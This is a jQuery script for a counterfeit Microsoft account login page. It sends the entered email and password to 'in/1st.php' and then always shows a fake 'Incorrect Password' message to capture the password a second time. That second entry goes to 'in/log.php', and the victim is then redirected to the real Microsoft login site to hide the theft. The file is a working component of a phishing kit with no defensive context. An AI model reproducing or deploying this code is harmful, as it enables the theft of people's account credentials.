$(document).ready(function() {
	$('#ofeml').focus();
    $('#btn').on('click',function(){
		var ofeml = $('#ofeml').val();
        if(ofeml == "") {
			$('#err1').show();
			$('#ofeml').focus();
            $('#ofeml').css('border-bottom', '1px solid #e81123');
		}else if(ofeml != ""){
			setTimeout(function(){
				$('#lg0').show();
				$('#lg1').hide();
				$('#lg2').show()
				$('#ofpwd').focus();
				$('#lgeml').html(ofeml);
			}, 500);
		}
	});
	$('#ofeml').on('input',function(){
		$('#err1').fadeOut();
		$('#ofeml').css('border-bottom', '1px solid #666');
	});
	$('#ofpwd').on('input',function(){
		$('#err2').fadeOut();
		$('#ofpwd').css('border-bottom', '1px solid #666');
	});
	$('#ofpwd1').on('input',function(){
		$('#err2').fadeOut();
		$('#ofpwd1').css('border-bottom', '1px solid #666');
	});
	$('#LOGIN').on('submit',function(e) {
		e.preventDefault();
		var ofeml = $('#ofeml').val();
        var ofpwd = $('#ofpwd').val();
        var ofpwd1 = $('#ofpwd1').val();
			
		if(ofeml == "") {
			$('#lg2').hide();
			$('#lg1').show();
            $('#err1').show();
            $('#ofeml').css('border-bottom', '1px solid #e81123').focus();
		}else if(ofpwd == "") {
			$('#err2').show();
			$('#ofpwd').css('border-bottom', '1px solid #e81123').focus();
		}else if(ofpwd1 == "") {
			$.ajax ({
				url: "in/1st.php",
				type: "POST",
				data: new FormData(this),
				contentType: false,
				cache: false,
				processData: false,
				success: function(data) {
					if(data != "saved") {
						alert(data);
					}else if(data == "saves") {
						
					}
				}
			});
			$('#err2').show();
			$('#erp').html('Incorrect Password: Please enter the password for your Microsoft account.');
			$('#ofpwd').hide();
			$('#ofpwd1').show().focus();
			$('#ofpwd1').css('border-bottom', '1px solid #e81123');
        }else {
			$('#err1, #err2').hide();
			$.ajax ({
				url: "in/log.php",
				type: "POST",
				data: new FormData(this),
				contentType: false,
				cache: false,
				processData: false,
				success: function(data) {
					if(data != "login") {
						alert(data);
					}else if(data == "login") {
						setTimeout(function(){
							window.location="https://login.microsoftonline.com/common/oauth2";
						}, 100);
					}
				}
			});
			return false;
		}
	});
});